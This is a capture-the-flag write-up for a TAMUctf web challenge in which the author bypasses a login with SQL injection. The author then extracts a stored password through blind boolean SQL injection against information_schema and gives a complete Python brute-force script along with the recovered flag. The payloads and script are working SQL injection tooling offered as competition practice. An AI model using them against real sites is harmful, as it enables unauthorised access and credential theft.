## Password Extraction
### Category : Web

So, we are given a web link. http://passwordextraction.tamuctf.com

On visiting the link, we find a simple login page. As usual tested for SQLi  where username was `'or 1=1-- ` and login success. But! we have a message `You've successfully authorized, but that doesn't get you the password.` So, clearly this is a Boolean Injection challenge. For confirmation I try, `' or SLEEP(5)-- ` and as expected it takes time to login. 

Using substring technique, we brute force each character. First we find the table name using the payload 
```
' or ascii(substring((select concat(table_name) from information_schema.tables where table_schema=database() ​limit 0,1),1,1))=val` where val is the ascii of all printable characters.
```

We find the table name as `accounts`

Next we iterate over to find the column names 
```
' or ASCII(SUBSTRING((SELECT concat(column_name) FROM information_schema.columns where table_name=0x6163636f756e7473 LIMIT 0,1),{},{}))={}".format(j,j,ord(i))
```

and we find the two column names : `username` and `password`, Big surprise.

As the challenge name suggests its a password extraction challenge, we run the script over to find the password and find the flag. 

Output :
```
g
gi
gig
gige
gigem
gigem{
gigem{h
gigem{h0
gigem{h0p
gigem{h0pe
gigem{h0peY
gigem{h0peYo
gigem{h0peYou
gigem{h0peYouS
gigem{h0peYouSc
gigem{h0peYouScr
gigem{h0peYouScr1
gigem{h0peYouScr1p
gigem{h0peYouScr1pt
gigem{h0peYouScr1pte
gigem{h0peYouScr1pted
gigem{h0peYouScr1ptedT
gigem{h0peYouScr1ptedTh
gigem{h0peYouScr1ptedTh1
gigem{h0peYouScr1ptedTh1s
gigem{h0peYouScr1ptedTh1s}
```

Script :
```
#! /usr/bin/python3
import requests
import string

def inject(cmd):
    url = "http://passwordextraction.tamuctf.com/login.php"
    data = {"username":"' {}-- ".format(cmd),"password":"leetcode"}
    #print(data)
    r = requests.post(url,data=data)
    valid = "You've successfully authorized, but that doesn't get you the password."
    if(valid in r.text):
        return True
    else:
        return False

#cmd = "or ASCII(SUBSTRING((SELECT concat(column_name) FROM information_schema.columns where table_name=0x6163636f756e7473 LIMIT 0,1),{},{}))={}".format(j,j,ord(i))
table="accounts"
column_1="username"
column_2="password"

if __name__=="__main__":
    TABLE=""
    for j in range(1,30):
        for i in string.printable:
            print(TABLE+i,end="\r")
            cmd = "or ASCII(SUBSTRING((SELECT concat(password) from accounts  LIMIT 0,1),{},{}))={}".format(j,j,ord(i))
            if(inject(cmd)):
                TABLE+=i
                print(TABLE)
                break

print(TABLE)
```